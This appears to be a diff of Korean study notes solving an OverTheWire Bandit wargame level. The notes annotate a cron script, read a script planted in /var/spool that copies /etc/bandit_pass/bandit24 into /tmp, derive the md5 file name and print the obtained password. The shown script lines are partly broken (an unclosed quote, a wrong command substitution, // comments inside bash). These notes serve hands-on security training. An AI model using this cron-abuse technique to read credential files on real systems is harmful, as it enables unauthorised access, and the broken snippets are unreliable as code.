@@ -27,12 +27,50 @@ myname=$(whoami)
 
 cd /var/spool/$myname
 echo "Executing and deleting all scripts in /var/spool/$myname:"
-for i in * .*;
+for i in * .*; //*이 의미하는 것은 '모든 것' 이다. var/spool 안의 모든 파일을 iterate 하라는 말
 do
-    if [ "$i" != "." -a "$i" != ".." ];
+    if [ "$i" != "." -a "$i" != ".." ]; //파일 이름이 . 이거나 .. 이면 아무것도 하지 마라 라는 뜻
     then
 	echo "Handling $i"
-	timeout -s 9 60 ./$i
-	rm -f ./$i
+	timeout -s 9 60 ./$i  //9: kill signal, 60초라는 시간 제한을 두고 실행하는 것
+	rm -f ./$i // 60초 마다 실행하고 죽이고를 반복. rm: 삭제하라는 뜻
     fi
 done
+
+그럼 일단 $find /var/spool을 해보고 그럼
+
+bandit23@bandit:~$ find /var/spool
+/var/spool
+/var/spool/mail
+/var/spool/bandit24
+/var/spool/bandit24/echo 666
+/var/spool/rsyslog
+find: ‘/var/spool/rsyslog’: Permission denied
+/var/spool/cron
+/var/spool/cron/crontabs
+find: ‘/var/spool/cron/crontabs’: Permission denied
+이렇게 뜬다. 
+
+에코 파일에 한 번 들어가보자.
+$cat /var/spool/bandit24/echo\ 666
+해당 파일 이름에 스페이스가 있기 때문에 \ 이걸로 indicate 해줄 것!
+
+그럼 
+bandit23@bandit:~$ cat /var/spool/bandit24/echo\ 666
+#!/bin/bash
+
+myname=$(bandit24)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget
+
+cat /etc/bandit_pass/$myname > /tmp/ithurtswhenIP
+이렇게 뜬다. 여기서
+
+$echo I am user bandit24 | md5sum | cut -d ' ' -f 1
+user name에 bandit24를 입력해서 엔터를 누르면 
+ee4ee1703b083edac9f8183e4ae70293 이게 뜨고, 
+$ cat /tmp/ee4ee1703b083edac9f8183e4ae70293 입력하면
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
